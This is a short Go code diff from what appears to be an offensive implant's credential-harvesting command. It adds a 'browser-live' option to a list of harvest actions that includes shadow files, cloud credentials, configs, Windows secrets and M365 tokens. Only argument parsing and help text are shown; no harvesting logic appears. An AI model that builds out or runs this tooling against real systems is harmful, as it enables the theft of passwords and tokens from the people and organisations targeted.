@@ -16,15 +16,15 @@ func (c *CredHarvestCommand) Description() string {
 }
 
 type credHarvestArgs struct {
-	Action string `json:"action"` // shadow, cloud, configs, windows, all
+	Action string `json:"action"` // shadow, cloud, configs, windows, browser-live, all
 	User   string `json:"user"`   // Filter by username (optional)
 }
 
 func (c *CredHarvestCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		actions := "shadow, cloud, configs, history, all"
+		actions := "shadow, cloud, configs, history, browser-live, all"
 		if runtime.GOOS == "windows" {
-			actions = "cloud, configs, windows, m365-tokens, history, all"
+			actions = "cloud, configs, windows, m365-tokens, history, browser-live, all"
 		}
 		return errorf("Error: parameters required. Actions: %s", actions)
 	}
